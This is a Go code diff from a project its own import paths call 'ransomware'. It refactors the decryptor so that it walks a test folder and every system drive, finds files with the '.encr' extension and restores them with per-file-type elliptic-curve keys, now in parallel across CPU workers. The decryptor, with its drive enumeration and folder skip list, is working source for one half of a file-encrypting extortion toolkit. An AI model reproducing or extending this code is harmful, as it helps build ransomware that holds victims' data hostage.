@@ -4,17 +4,20 @@ import (
 	"crypto/ecdsa"
 	"fmt"
 	"io/fs"
+	"os"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/eccLib"
 	"ransomware/io"
 	"ransomware/utils"
+	"runtime"
 	"strings"
 	"sync"
 )
 
 var (
-	waitGroup sync.WaitGroup
+	waitGroup  sync.WaitGroup
+	NumWorkers = runtime.NumCPU()
 )
 
 func main() {
@@ -26,71 +29,71 @@ func main() {
 		panic(err)
 	}
 
-	// currentDirectory, _ := os.Getwd()
-	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-
-	// decryptFiles(dir, privKeys)
+	currentDirectory, _ := os.Getwd()
+	dir := string(filepath.Dir(currentDirectory) + "/testFolder")
+	decryptFiles([]string{dir}, privKeys)
 
 	drives := utils.GetDrives()
-	for _, drive := range drives {
-		decryptFiles(drive, privKeys)
-	}
+	decryptFiles(drives, privKeys)
 
 }
 
-func decryptFiles(dirPath string, privKeys []*ecdsa.PrivateKey) {
+func decryptFiles(dirPaths []string, privKeys []*ecdsa.PrivateKey) {
 
 	var filesToVisit = make(chan io.File)
 	var ext string
 	waitGroup.Add(1)
 	go func() {
-		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
+		for _, dirPath := range dirPaths {
+			filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
 
-			if d.IsDir() {
+				if d.IsDir() {
 
-				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
-					return filepath.SkipDir
-				}
-			}
-
-			if !d.IsDir() {
-				ext = filepath.Ext(path)
-
-				if ext == ".encr" {
-					info, err := d.Info()
-					if err != nil {
-						return err
-					}
-
-					split := strings.Split(path, ".")
-					if len(split) >= 2 {
-						ext = split[len(split)-2]
-						filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
+					if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
+						return filepath.SkipDir
 					}
 				}
-			}
-			return nil
-		})
 
-		defer close(filesToVisit)
-		defer waitGroup.Done()
-	}()
+				if !d.IsDir() {
+					ext = filepath.Ext(path)
 
-	waitGroup.Add(1)
-	go func() {
-		for file := range filesToVisit {
+					if ext == ".encr" {
+						info, err := d.Info()
+						if err != nil {
+							return err
+						}
 
-			fileType, mapContains := utils.FileType[file.Extension]
-			if mapContains && privKeys[fileType] != nil {
-				err := io.DecryptFile(&file, encryption.ECDHAESDecrypt, privKeys[fileType])
-				if err != nil {
-					fmt.Println("Error decrypting file", file.Path, "Error:", err)
+						split := strings.Split(path, ".")
+						if len(split) >= 2 {
+							ext = split[len(split)-2]
+							filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
+						}
+					}
 				}
-			}
-
+				return nil
+			})
 		}
+		close(filesToVisit)
 		defer waitGroup.Done()
 	}()
+
+	for i := 0; i < NumWorkers; i++ {
+		waitGroup.Add(1)
+		go func() {
+			for file := range filesToVisit {
+
+				fileType, mapContains := utils.FileType[file.Extension]
+				if mapContains && privKeys[fileType] != nil {
+					err := io.DecryptFile(&file, encryption.ECDHAESDecrypt, privKeys[fileType])
+					if err != nil {
+						fmt.Println("Error decrypting file", file.Path, "Error:", err)
+					}
+				}
+
+			}
+			defer waitGroup.Done()
+		}()
+	}
 
 	waitGroup.Wait()
 }
